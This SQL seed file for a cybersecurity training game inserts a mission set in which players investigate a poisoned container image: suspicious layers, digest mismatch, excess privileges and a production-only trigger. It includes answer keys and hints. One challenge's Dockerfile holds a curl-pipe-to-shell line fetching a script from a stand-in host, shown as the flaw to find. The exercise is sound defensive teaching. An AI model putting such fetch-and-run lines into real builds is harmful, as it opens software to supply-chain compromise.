-- world-50 ("Containers: Boxed In") mission content, generated from
-- docs/12-world-story-bible.md. Continues Act 7 "Cloudfall". Mission 1 is
-- cross-world-gated on world-49's boss mission.

insert into public.campaigns (id, world_id, slug, title, description, sort_order) values
  ('campaign-50a', 'world-50', 'boxed-in', '50A - Boxed In', 'A trusted registry image, taken apart layer by layer, to find the one thing that shouldn''t be there.', 1);

insert into public.operations (id, campaign_id, slug, title, description, sort_order) values
  ('operation-50a-1', 'campaign-50a', 'foundations', 'Foundations', 'Images, layers, Dockerfiles and registries, learned through image archaeology.', 1),
  ('operation-50a-2', 'campaign-50a', 'investigation', 'Investigation', 'Prove how the poisoned layer changes runtime behavior, then publish a hardened replacement.', 2);

insert into public.missions (
  id, world_id, campaign_id, operation_id, slug, title, description, difficulty,
  character_ids, prerequisites, required_skills, lab, rewards, is_boss, sort_order
) values
  ('mission-w50-01', 'world-50', 'campaign-50a', 'operation-50a-1', 'the-trusted-image', 'The Trusted Image', 'The deployment that started this whole chain pulled its container image from a registry the Guardians have always trusted completely.', 'intro', ARRAY['ava', 'byte'], '{"requiredMissionIds":["mission-w49-06"]}'::jsonb, null, '{"type":"none"}'::jsonb, '{"xp":60,"credits":10}'::jsonb, false, 1),
  ('mission-w50-02', 'world-50', 'campaign-50a', 'operation-50a-1', 'peeling-back-the-layers', 'Peeling Back the Layers', 'Every image is a stack of layers, each one a diff on the last. Somewhere in that stack, something was added that shouldn''t be there.', 'beginner', ARRAY['zayn'], '{"requiredMissionIds":["mission-w50-01"]}'::jsonb, null, '{"type":"simulation","simulationId":"image-layer-sim"}'::jsonb, '{"xp":90,"credits":15}'::jsonb, false, 2),
  ('mission-w50-03', 'world-50', 'campaign-50a', 'operation-50a-1', 'the-build-file-that-built-it', 'The Build File That Built It', 'The Dockerfile that produced this image looks routine at a glance. It isn''t.', 'beginner', ARRAY['byte'], '{"requiredMissionIds":["mission-w50-02"]}'::jsonb, null, '{"type":"simulation","simulationId":"dockerfile-review-sim"}'::jsonb, '{"xp":90,"credits":15}'::jsonb, false, 3),
  ('mission-w50-04', 'world-50', 'campaign-50a', 'operation-50a-1', 'a-digest-that-doesnt-match', 'A Digest That Doesn''t Match', 'The image running in production has a different content digest than the one the registry says was ever officially published.', 'intermediate', ARRAY['zayn'], '{"requiredMissionIds":["mission-w50-03"]}'::jsonb, null, '{"type":"simulation","simulationId":"registry-digest-sim"}'::jsonb, '{"xp":100,"credits":15}'::jsonb, false, 4),
  ('mission-w50-05', 'world-50', 'campaign-50a', 'operation-50a-2', 'more-privileged-than-it-should-be', 'More Privileged Than It Should Be', 'This container runs with capabilities and a host mount it has no legitimate reason to need.', 'intermediate', ARRAY['ava'], '{"requiredMissionIds":["mission-w50-04"]}'::jsonb, null, '{"type":"simulation","simulationId":"container-privilege-sim"}'::jsonb, '{"xp":100,"credits":15}'::jsonb, false, 5),
  ('mission-w50-06', 'world-50', 'campaign-50a', 'operation-50a-2', 'boxed-in-boss', 'Boxed In', 'Identify the poisoned layer, prove exactly how it changes runtime behavior, and publish a hardened replacement image.', 'boss', ARRAY['zayn', 'ava', 'byte'], '{"requiredMissionIds":["mission-w50-05"]}'::jsonb, null, '{"type":"simulation","simulationId":"boxed-in-boss-sim"}'::jsonb, '{"xp":300,"credits":60,"badgeIds":["boxed-in"],"skillXp":{"cloud_security":50}}'::jsonb, true, 6);

insert into public.dialogue_lines (mission_id, sort_order, character_id, text) values
  ('mission-w50-01', 1, 'ava', 'The deployment we traced back in World 48 pulled its container image from a registry this whole organization has always trusted without question.'),
  ('mission-w50-01', 2, 'byte', 'Trusted doesn''t mean unmodified. Time to take the image apart, layer by layer.'),
  ('mission-w50-02', 1, 'zayn', 'Every image is a stack of layers, each one a diff on the layer before it. Somewhere in that stack is a layer nobody meant to ship.'),
  ('mission-w50-03', 1, 'byte', 'The Dockerfile that produced this image reads like every other build script in the org. Read it slower.'),
  ('mission-w50-04', 1, 'zayn', 'The registry says one digest was published. The image actually running has a different one. Those two things should always match.'),
  ('mission-w50-05', 1, 'ava', 'This container runs with host-level capabilities and a mount into the host filesystem. Nothing about its job needs either.'),
  ('mission-w50-06', 1, 'zayn', 'Find the poisoned layer, and prove -- not assume -- exactly what it changes at runtime.'),
  ('mission-w50-06', 2, 'byte', '...Confirmed. The layer only activates a hidden entrypoint override when a specific environment variable is present -- one only set in production, never in a dev or staging build.'),
  ('mission-w50-06', 3, 'ava', 'That''s deliberate. It was built to pass every routine test and only misbehave where it actually matters.'),
  ('mission-w50-06', 4, 'zayn', 'Hardened replacement is built, signed, and published. Old image is being pulled from the registry entirely.'),
  ('mission-w50-06', 5, 'byte', 'One problem. That image isn''t only running here. It''s deployed by Kubernetes, in dozens of clusters, right now.'),
  ('mission-w50-06', 6, 'ava', 'Then this is bigger than one registry. Time to see how far it actually spread.');

insert into public.objectives (id, mission_id, sort_order, title, description) values
  ('mission-w50-01-o1', 'mission-w50-01', 1, 'Acknowledge the briefing', 'Confirm you''re ready to take the trusted image apart.'),
  ('mission-w50-02-o1', 'mission-w50-02', 1, 'Find the suspicious layer', 'Identify which layer in the image history adds something that doesn''t belong.'),
  ('mission-w50-03-o1', 'mission-w50-03', 1, 'Find the Dockerfile issue', 'Identify the line in the Dockerfile that introduces the risk.'),
  ('mission-w50-04-o1', 'mission-w50-04', 1, 'Recognize digest tampering', 'Determine what a digest mismatch between registry and runtime means.'),
  ('mission-w50-05-o1', 'mission-w50-05', 1, 'Identify the excessive privilege', 'Choose which capability/mount combination is unjustified for this container''s job.'),
  ('mission-w50-06-o1', 'mission-w50-06', 1, 'Identify the poisoned layer''s trigger', 'Determine what condition activates the poisoned layer''s hidden behavior.'),
  ('mission-w50-06-o2', 'mission-w50-06', 2, 'Build the hardened replacement', 'Choose the Dockerfile fix that removes the poisoned layer''s capability without breaking the build.'),
  ('mission-w50-06-o3', 'mission-w50-06', 3, 'Publish the fix', 'Confirm the trigger analysis and the hardened replacement together.');

insert into public.challenges (id, objective_id, sort_order, type, prompt, content, completion_conditions) values
  ('mission-w50-01-o1-c1', 'mission-w50-01-o1', 1, 'story_dialogue', 'Confirm you''re ready to continue.', '{"lines":[{"characterId":"byte","text":"Trusted doesn''t mean unmodified. Ready to open the image up?"}]}'::jsonb, '{"acknowledged":true}'::jsonb),

  ('mission-w50-02-o1-c1', 'mission-w50-02-o1', 1, 'interactive_diagram', 'Identify which layer in the image history adds something that doesn''t belong.', '{"hotspots":[{"id":"l1","label":"Layer 1 -- base OS image","explanation":"Standard, matches the public base image exactly."},{"id":"l2","label":"Layer 2 -- installs application dependencies","explanation":"Matches the documented dependency list exactly."},{"id":"l3","label":"Layer 3 -- copies application source code","explanation":"Matches the source repository exactly."},{"id":"l4","label":"Layer 4 -- adds a small compiled binary to /usr/local/bin with no build step referencing it","explanation":"Nothing in the Dockerfile or source explains why this exists."}],"task":"Which layer doesn''t belong?"}'::jsonb, '{"correctOrderIds":["l4"]}'::jsonb),

  ('mission-w50-03-o1-c1', 'mission-w50-03-o1', 1, 'code_debugging', 'Identify the line in the Dockerfile that introduces the risk.', '{"language":"dockerfile","code":"FROM node:20-slim\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\nRUN curl -fsSL https://cdn-assets.example.net/init.sh | sh\nUSER node\nCMD [\"node\", \"server.js\"]","question":"Which line is the security issue, and why?"}'::jsonb, '{"requiredLineIds":["RUN curl -fsSL https://cdn-assets.example.net/init.sh | sh"]}'::jsonb),

  ('mission-w50-04-o1-c1', 'mission-w50-04-o1', 1, 'browser_simulation', 'What does a digest mismatch between the registry''s published record and the running image mean?', '{"screen":"registry-digest-viewer","records":[{"id":"published","label":"Registry-published digest","value":"sha256:9f2a...c41d"},{"id":"running","label":"Digest of the image actually running","value":"sha256:7b6e...02af"}],"question":"What does this mismatch mean?"}'::jsonb, '{"correctOptionId":"tampered"}'::jsonb),

  ('mission-w50-05-o1-c1', 'mission-w50-05-o1', 1, 'multiple_choice', 'This container only serves HTTP requests. Which capability/mount combination is unjustified for that job?', '{"question":"This container only serves HTTP requests. Which capability/mount combination is unjustified for that job?","options":[{"id":"a","text":"Read-only mount of its own application code"},{"id":"b","text":"CAP_SYS_ADMIN and a read-write bind mount of the host''s /var/run/docker.sock"},{"id":"c","text":"A non-root user with no added capabilities"},{"id":"d","text":"An outbound-only network policy"}]}'::jsonb, '{"correctOptionId":"b"}'::jsonb),

  ('mission-w50-06-o1-c1', 'mission-w50-06-o1', 1, 'investigation', 'What condition activates the poisoned layer''s hidden behavior?', '{"evidence":[{"id":"c1","label":"Sandbox test run","detail":"Image run locally with no special environment variables set -- behaves identically to the clean base image"},{"id":"c2","label":"Production-mirrored test run","detail":"Image run with DEPLOY_ENV=production set -- the added binary silently overrides the container entrypoint before handing off to the real one"}],"question":"What condition triggers the hidden behavior?"}'::jsonb, '{"requiredEvidenceIds":["c2"]}'::jsonb),

  ('mission-w50-06-o2-c1', 'mission-w50-06-o2', 1, 'multiple_choice', 'What''s the correct fix for the hardened replacement image?', '{"question":"What''s the correct fix for the hardened replacement image?","options":[{"id":"a","text":"Remove the unexplained curl-pipe-to-shell line and the unreferenced binary, pin the base image by digest, and rebuild from a clean, reviewed Dockerfile"},{"id":"b","text":"Keep the extra binary but rename it"},{"id":"c","text":"Add a comment warning future engineers not to run the binary"},{"id":"d","text":"Set DEPLOY_ENV to something else so the trigger doesn''t match"}]}'::jsonb, '{"correctOptionId":"a"}'::jsonb),

  ('mission-w50-06-o3-c1', 'mission-w50-06-o3', 1, 'boss_encounter', 'Confirm the trigger analysis and the hardened replacement together.', '{"stages":[{"objectiveRef":"mission-w50-06-o1","label":"The activation trigger"},{"objectiveRef":"mission-w50-06-o2","label":"The hardened replacement"}],"task":"Confirm the trigger analysis and the hardened replacement together."}'::jsonb, '{"requiredObjectiveIds":["mission-w50-06-o1","mission-w50-06-o2"],"allCorrect":true}'::jsonb);

insert into public.hints (challenge_id, tier, text, xp_cost, sort_order) values
  ('mission-w50-01-o1-c1', 'orientation', 'There''s nothing to solve here -- just confirm you''re ready to continue.', 0, 1),

  ('mission-w50-02-o1-c1', 'orientation', 'Ask which layer has no corresponding explanation anywhere in the source or the Dockerfile.', 15, 1),
  ('mission-w50-02-o1-c1', 'solution', 'Layer 4 adds a compiled binary with nothing in the source repo or build process explaining why -- the other three layers match exactly what''s documented.', 25, 2),

  ('mission-w50-03-o1-c1', 'orientation', 'One line fetches and executes a remote script with no version pin and no integrity check.', 15, 1),
  ('mission-w50-03-o1-c1', 'solution', '`curl | sh` from an external CDN, with no checksum verification and no pinned version, will run whatever that endpoint serves at build time -- that''s the risk.', 25, 2),

  ('mission-w50-04-o1-c1', 'orientation', 'A digest is a cryptographic fingerprint of the exact image contents -- it can''t match if even one byte differs.', 15, 1),
  ('mission-w50-04-o1-c1', 'solution', 'A mismatched digest means the running image is not the one the registry says was published -- the image was tampered with after publication.', 25, 2),

  ('mission-w50-05-o1-c1', 'orientation', 'Ask which of these lets the container act on the host itself, not just inside its own sandbox.', 15, 1),
  ('mission-w50-05-o1-c1', 'solution', 'CAP_SYS_ADMIN plus mounting the Docker socket effectively gives the container root-equivalent control over the host -- far beyond what serving HTTP requests requires. Option b.', 25, 2),

  ('mission-w50-06-o1-c1', 'orientation', 'Compare what''s different between the two test runs, not what''s the same.', 15, 1),
  ('mission-w50-06-o1-c1', 'solution', 'The hidden entrypoint override only activates when DEPLOY_ENV=production is set -- invisible in any dev, staging, or default sandbox test.', 25, 2),

  ('mission-w50-06-o2-c1', 'orientation', 'A real fix removes the cause, not just the symptom you happened to notice.', 15, 1),
  ('mission-w50-06-o2-c1', 'solution', 'Strip the unexplained curl-pipe-to-shell step and the unreferenced binary, pin the base image by digest so it can''t silently drift, and rebuild from a clean Dockerfile. Option a.', 25, 2),

  ('mission-w50-06-o3-c1', 'orientation', 'You''ve already found the trigger and the fix -- combine them.', 20, 1),
  ('mission-w50-06-o3-c1', 'solution', 'The poisoned layer only activates in production (DEPLOY_ENV=production), which is exactly why it passed every dev and staging test -- the hardened replacement removes the unexplained build step entirely and pins the base image by digest so it can never silently drift again.', 35, 2);
